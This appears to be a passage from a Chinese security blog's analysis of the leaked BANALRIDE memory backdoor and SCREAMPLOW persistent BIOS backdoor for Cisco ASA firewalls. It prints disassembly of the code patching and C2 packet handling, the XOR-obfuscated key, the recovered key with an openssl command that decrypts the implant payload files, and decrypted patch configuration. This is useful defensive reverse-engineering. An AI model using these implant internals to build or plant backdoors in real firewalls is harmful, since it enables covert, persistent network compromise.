class="brush:bash;toolbar:false">0xddfeb645:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x916bbb0,%ebx
……
0xddfeb678:&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;$0xa
0xddfeb67a:&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%eax
0xddfeb67b:&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;$0x807bef1
0xddfeb680:&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;*%ebx
0xddfeb682:&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;$0xe
0xddfeb684:&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;-0x4c(%ebp),%eax
0xddfeb687:&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;%eax
0xddfeb688:&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;$0x80612c1
0xddfeb68d:&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;*%ebx
0xddfeb68f:&nbsp;&nbsp;movb&nbsp;&nbsp;&nbsp;$0xe9,
0x8660c93
0xddfeb696:&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;$0x1,%eax
0xddfeb69b:&nbsp;&nbsp;movl&nbsp;&nbsp;&nbsp;$0xffa00629,0x8660c94</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">其中0x916bbb0是ASA系统内存copy函数，将第二个参数指向地址copy到第一个参数指向内存中，长度由第三个参数控制。lina进程空间中代码段改动前后对比如下图所示：</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t012c06d6b743e87495.png" title="t0122b59bb963aa589b.png" alt="http://p9.qhimg.com/t0122b59bb963aa589b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">BANALRIDE后门植入到内存中时修改sub_8660C30函数中0x08660C93地址处代码，使程序流程跳出当前函数。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在地址0x80612c1处写入了进入后门代码区的跳转指令，其中0xC5514B68就是存放后门代码的地址，这个地址是变化的，由初始化阶段动态申请。最后在0x807bef1处写入了当BANALRIDE代码执行结束后返回sub_8660C30函数正常流程的跳转指令，整个跳转流程如下图：</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0169657d28a3c84df7.png" title="t016dd8f7b83dc1e677.png" alt="http://p7.qhimg.com/t016dd8f7b83dc1e677.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在这个流程图中可以看到，其实BANALRIDE后门在内存中每次运行的生命周期为从接收到一个网络报文起，到处理这个报文结束为止。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">（2）网络发送函数：</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从代码中可看到BANALRIDE向控制端发送网络报文时复用lina函数的过程，首先调用sub_89BD690函数创建一个描述数据报文的结构变量，大小为0x60E（1550）字节，代码如下：</span></p><pre class="brush:bash;toolbar:false">MEMORY:C551524E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;60Eh
MEMORY:C5515253&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebp+var_10],&nbsp;eax
MEMORY:C5515256&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;89BD690h
MEMORY:C551525B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movzx&nbsp;&nbsp;&nbsp;edi,&nbsp;[ebp+arg_14]
MEMORY:C551525F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;eax</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对sub_89BD690返回数据的结构进行分析结果如下：</span></p><pre class="brush:bash;toolbar:false">struct&nbsp;struc_send_pkt
{
&nbsp;&nbsp;char&nbsp;unknow_str1[30];
&nbsp;&nbsp;char&nbsp;mac_src[6];
&nbsp;&nbsp;char&nbsp;mac_dst[6];
&nbsp;&nbsp;_WORD&nbsp;type;
&nbsp;&nbsp;char&nbsp;vlan_tag[4];
&nbsp;&nbsp;char&nbsp;*p_ip_packet;
&nbsp;&nbsp;char&nbsp;*p_Buff;
&nbsp;&nbsp;char&nbsp;unknow_str2[4];
&nbsp;&nbsp;struc_send_udp_info&nbsp;*p_send_udp_info;
&nbsp;&nbsp;char&nbsp;unknow_str3[728];
&nbsp;&nbsp;char&nbsp;ip_header[20];
&nbsp;&nbsp;char&nbsp;udp_header[8];
};</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到此结构体中包含了发送数据包二层及三层报文头部各字段的详细信息，虽然sub_89BD690函数申请了1550字节长度的内存空间，但这个结构体只规定了此段内存前820字节长度的数据格式，之后剩余部分填充为程序自定义的载荷数据，因此对sub_89BD690函数传参不能小于820字节。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ASA系统中对于发送报文的函数封装并不如在Linux系统中的系统调用简单明了，考虑到在struc_send_pkt结构中还需要填充二层网络目的地址，因此需要在ASA路由表中查找出报文的下一跳地址：</span></p><pre class="brush:bash;toolbar:false">MEMORY:C55151BA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;esi&nbsp;&nbsp;&nbsp;;buffer
MEMORY:C55151BB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;8778AF0h&nbsp;&nbsp;&nbsp;;route_table_lookup
MEMORY:C55151C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;[ebp+arg_8]&nbsp;&nbsp;;dst&nbsp;ip
MEMORY:C55151C3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;eax</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">sub_8778AF0函数查找出第一个参数指向的目的IP地址的下一跳IP，并将结果存放在第二个参数指向的地址中，返回结果是一个结构体，从起始偏移16字节为下一跳的IP，随后使用sub_84C0200函数在ARP表中查找出下一跳IP相应的MAC地址，再调用sub_84BE670函数将查询出的地址填充到struct_send_pkt中：</span><br/></p><pre class="brush:bash;toolbar:false">MEMORY:C55151CB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi
MEMORY:C55151CC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;84C0200h
MEMORY:C55151D1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[esi+10h]
MEMORY:C55151D4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;eax</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后将构造好的struc_send_pkt结构变量传递给sub_863FE50函数来构造完整的网络报文并添加到发送队列中：</span></p><pre class="brush:bash;toolbar:false">MEMORY:C55151F6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edx+4]
MEMORY:C55151F9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;[ebp+arg_0]&nbsp;&nbsp;;struc_send_pkt
MEMORY:C55151FC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax
MEMORY:C55151FD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[eax+0Ch]&nbsp;;&nbsp;0x863FE50</pre><p style="text-indent: 2em; text-align: left;"><strong>（<span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">3）传输通信加密</span></strong><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">BANALRIDE与控制端网络通讯时，在建立session阶段先使用Diffie-Hellman算法协商密钥，在此后的通讯中，所有数据都使用此密钥进行AES算法加密。当接收到控制指令时，会先判断有无session，代码如下：</span></p><pre class="brush:bash;toolbar:false">MEMORY:C551570E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;offset&nbsp;0xC55CFC34
MEMORY:C5515714&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[esi+14h]&nbsp;&nbsp;;&nbsp;UDP报文指针
MEMORY:C5515717&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebp+var_10],&nbsp;eax
MEMORY:C551571A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edi]
MEMORY:C551571C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte&nbsp;ptr&nbsp;[eax],&nbsp;0&nbsp;&nbsp;&nbsp;;&nbsp;判断session
MEMORY:C551571F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_C551576F</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">若已存在session则会再判断与之前建立的session的连接四元组信息，若session尚未建立先判断接收payload第一个字符也就是控制指令是否为A8，表明是否建立新的session，代码如下：</span></p><pre class="brush:bash;toolbar:false">MEMORY:C551576F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,&nbsp;[ebp+var_10]
MEMORY:C5515772&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;[esi+1Ch]
MEMORY:C5515775&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movzx&nbsp;&nbsp;&nbsp;eax,&nbsp;word&nbsp;ptr&nbsp;[edx+4]
MEMORY:C5515779&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movzx&nbsp;&nbsp;&nbsp;ecx,&nbsp;al
MEMORY:C551577C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;8
MEMORY:C551577F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;8
MEMORY:C5515782&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,&nbsp;eax
MEMORY:C5515784&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[ecx-8]
MEMORY:C5515787&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebp+var_14],&nbsp;eax&nbsp;;&nbsp;payload长度
MEMORY:C551578A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte&nbsp;ptr&nbsp;[esi+1Ch],&nbsp;0A8h&nbsp;;&nbsp;判断控制指令是否是0xA8</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">BANALRIDE会对接收到的payload进行完整性校验，具体方式通过计算比对payload最后两字节的校验和，验证通过后再计算加密密钥返回给控制端：</span></p><pre class="brush:bash;toolbar:false">MEMORY:C55157A4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;sub_C55156C0&nbsp;;&nbsp;a1:payload地址&nbsp;&nbsp;a2:payload长度
MEMORY:C55157A9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx
MEMORY:C55157AA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx
MEMORY:C55157AB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,&nbsp;edx
MEMORY:C55157AD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;al,&nbsp;al
MEMORY:C55157AF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_C55157CB
MEMORY:C55157B1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;esi
MEMORY:C55157B2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi
MEMORY:C55157B3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;sub_C551581D&nbsp;&nbsp;;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">计算校验和</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">处理流程见下图：</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t010f45d2c565ee0269.png" title="t0139f2c7930bc7879b.png" alt="http://p6.qhimg.com/t0139f2c7930bc7879b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">0x04&nbsp; SCREAMPLOW持久化后门分析</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第二节中我们介绍到SCREAMPLOW 作为持久化后门实际上是JETPLOW 升级版，后门程序在BANANAGLEE\BG3121\Install\LP目录下，先通过BPICKER-3100工具连接BG内存后门UDP500端口后，加载相关载荷模块植入到目标设备中，BPICKER-3100是writeScreamingPlow和writeJetPlow新版本，SCREAMPLOW种植持成功后也可使用lp工具对目标进行后续的连接和管理。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当BPICKER-3100与目标建立连接成功后，会收到目标返回的ASA系统和后门版本信息，然后在当前目录下搜索名称基于&lt;platform_name&gt;-moduledata-&lt;bg_version&gt;.tgz格式的文件，但目前泄露出的文件中只包含了唯一的版本：asa-moduledata-3101.tgz。此文件中包含了种植SCREAMPLOW所需的载荷以及配置文件等。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">对</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">BPICKER-3100进行静态代码分析发现，在植入过程中，会对asa-moduledata-3101.tgz文件中asa目录下的pif文件进行解密，其解密密钥通过硬编码方式写入在BPICKER-3100程序中，存储过程仅简单做了一次异或加密，获取密钥的相关代码如下：</span></p><pre class="brush:bash;toolbar:false">&nbsp;
&nbsp;&nbsp;v2&nbsp;=&nbsp;malloc(0x1Du);
&nbsp;&nbsp;v3&nbsp;=&nbsp;v2;
&nbsp;&nbsp;v4&nbsp;=&nbsp;v2&nbsp;==&nbsp;0;
&nbsp;&nbsp;v5&nbsp;=&nbsp;&quot;Couldn&#39;t&nbsp;malloc&nbsp;for&nbsp;key_data_copy.&quot;;
&nbsp;&nbsp;if&nbsp;(&nbsp;v4&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;LABEL_6;
&nbsp;&nbsp;*v3&nbsp;=&nbsp;0xC28AD3C7;
&nbsp;&nbsp;v3[1]&nbsp;=&nbsp;0xD8CFDCC5;
&nbsp;&nbsp;v3[2]&nbsp;=&nbsp;0xCCCBD8C9;
&nbsp;&nbsp;v3[3]&nbsp;=&nbsp;0xD9C38ADE;
&nbsp;&nbsp;v3[4]&nbsp;=&nbsp;0xC6DFCC8A;
&nbsp;&nbsp;v3[5]&nbsp;=&nbsp;0xCCC58AC6;
&nbsp;&nbsp;v3[6]&nbsp;=&nbsp;0xC6CFCF8A;
&nbsp;&nbsp;*((_BYTE&nbsp;*)v3&nbsp;+&nbsp;28)&nbsp;=&nbsp;-39;
&nbsp;&nbsp;v6&nbsp;=&nbsp;0;
&nbsp;&nbsp;do
&nbsp;&nbsp;&nbsp;&nbsp;*((_BYTE&nbsp;*)v3&nbsp;+&nbsp;v6++)&nbsp;^=&nbsp;0xAAu;
&nbsp;&nbsp;while&nbsp;(&nbsp;v6&nbsp;&lt;=&nbsp;28&nbsp;);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">解密后的明文密钥为：my hovercraft is full of eels。随后对于所有pif文件进行解密，命令如下：</span><br/><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:bash;toolbar:false">find&nbsp;.&nbsp;-iname&nbsp;&quot;*.pif&quot;&nbsp;-type&nbsp;f&nbsp;-print&nbsp;-exec&nbsp;sh&nbsp;-c&nbsp;&#39;openssl&nbsp;base64&nbsp;-d&nbsp;-in&nbsp;{}&nbsp;|&nbsp;openssl&nbsp;aes-128-cbc&nbsp;-d&nbsp;-nosalt&nbsp;-md&nbsp;md5&nbsp;-k&nbsp;&quot;my&nbsp;hovercraft&nbsp;is&nbsp;full&nbsp;of&nbsp;eels&quot;&nbsp;&gt;&nbsp;{}.xml&#39;&nbsp;\;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解密后的pif文件部分内容如下：</span></p><pre class="brush:bash;toolbar:false">&lt;?xml&nbsp;version=&quot;1.0&quot;&nbsp;encoding=&quot;iso-8859-1&quot;?&gt;
&lt;platform&nbsp;xsi:noNamespaceSchemaLocation=&quot;versionFile.xsd&quot;
&nbsp;&nbsp;&nbsp;&nbsp;xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
&nbsp;&nbsp;&nbsp;&nbsp;lib=&quot;libasa.so&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;name&gt;asa5505&lt;/name&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;version&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;name&gt;1.0(12)6&nbsp;(no&nbsp;persistence&nbsp;detected)&lt;/name&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;originalBios&gt;bin/asa5505/asa5505_10126_bios_sectors1-E_clean.bin&lt;/originalBios&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;patchList&gt;&lt;!--&nbsp;Install&nbsp;SCP&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;data&nbsp;src=&quot;inline&quot;&nbsp;type=&quot;userarea&quot;&gt;0&lt;/data&gt;&nbsp;&lt;!--&nbsp;Assigned&nbsp;later&nbsp;&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;address&gt;fff70000&lt;/address&gt;&nbsp;&lt;!--&nbsp;SECOND_USER_AREA_ADDRESS&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;data&nbsp;src=&quot;file&quot;&gt;bin/asa5505/SCP28/asa5505_patch60000.bin&lt;/data&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;address&gt;fff60000&lt;/address&gt;&nbsp;&lt;!--&nbsp;FIRST_CODE_AREA_ADDRESS&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;data&nbsp;src=&quot;inline&quot;&nbsp;type=&quot;pbd&quot;&gt;0&lt;/data&gt;&nbsp;&lt;!--&nbsp;Assigned&nbsp;later&nbsp;&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;address&gt;fff6df00&lt;/address&gt;&nbsp;&lt;!--&nbsp;FIRST_USER_AREA_ADDRESS&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;patch&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;data&nbsp;src=&quot;file&quot;&gt;bin/asa5505/SCP28/asa5505_patchEC480.bin&lt;/data&gt;
